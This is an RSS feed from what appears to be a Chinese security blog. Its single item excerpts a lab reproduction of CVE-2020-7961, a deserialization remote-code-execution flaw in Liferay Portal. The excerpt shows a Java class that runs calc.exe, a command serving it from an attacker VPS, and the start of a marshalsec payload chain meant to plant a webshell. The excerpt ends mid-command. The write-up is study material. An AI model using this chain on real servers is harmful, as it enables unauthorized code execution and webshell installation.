<?xml version="1.0" encoding="utf-8" standalone="yes"?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Java反序列化 on wh1sper</title>
    <link>https://anthem-whisper.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</link>
    <description>Recent content in Java反序列化 on wh1sper</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <lastBuildDate>Mon, 15 Jun 2020 00:00:00 +0000</lastBuildDate><atom:link href="https://anthem-whisper.github.io/tags/java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.xml" rel="self" type="application/rss+xml" />
    <item>
      <title>CVE-2020-7961 Liferay Portal 反序列化-复现</title>
      <link>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Mon, 15 Jun 2020 00:00:00 +0000</pubDate>
      
      <guid>https://anthem-whisper.github.io/p/cve-2020-7961-liferay-portal-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%A4%8D%E7%8E%B0/</guid>
      <description>漏洞说明 Liferay是一个开源的Portal产品,提供对多个独立系统的内容集成,为企业信息、流程等的整合提供了一套完整的解决方案,和其他商业产品相比,Liferay有着很多优良的特性,而且免费,在全球都有较多用户。该漏洞是个反序列化导致的RCE，通过未授权访问其api传递json数据进行反序列化，危害较高
影响范围 Liferay Portal 6.1、6.2、7.0、7.1、7.2
环境搭建 漏洞环境：
windows 10
jre1.8.0_221
jdk1.8.0_221
tomcat集成包：https://github.com/liferay/liferay-portal/releases/tag/7.2.0-ga1 （我用的liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761.tar.gz）
启动环境 E:\tmp\liferay-ce-portal-tomcat-7.2.0-ga1-20190531153709761\liferay-portal-7.2.0-ga1\tomcat-9.0.17\bin&amp;gt; .\catalina.bat run访问 http://localhost:8080/ 全部默认配置就可以
漏洞利用 思路：构造恶意class文件-&amp;gt;构造序列化-&amp;gt;反序列化-&amp;gt;加载VPS上面恶意evil.class文件-&amp;gt;实现下载webshell
构造恶意class文件 在VPS上面创建 LifExp.java（该写法为目标是Windows，运行计算器）-&amp;gt;编译class文件
public class LifExp { static { try { String[] cmd = {&amp;quot;cmd.exe&amp;quot;, &amp;quot;/c&amp;quot;, &amp;quot;calc.exe&amp;quot;};//命令执行java.lang.Runtime.getRuntime().exec(cmd).waitFor(); } catch ( Exception e ) { e.printStackTrace(); } } }使用 javac .\LifExp.java 生成class文件
在当前目录使用 python -m SimpleHTTPServer 8000 监听8000端口启动一个wbe服务
构造序列化 使用 marshalsec-0.0.3-SNAPSHOT-all.jar 文件进行序列化：
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.</description>
    </item>
    
  </channel>
</rss>
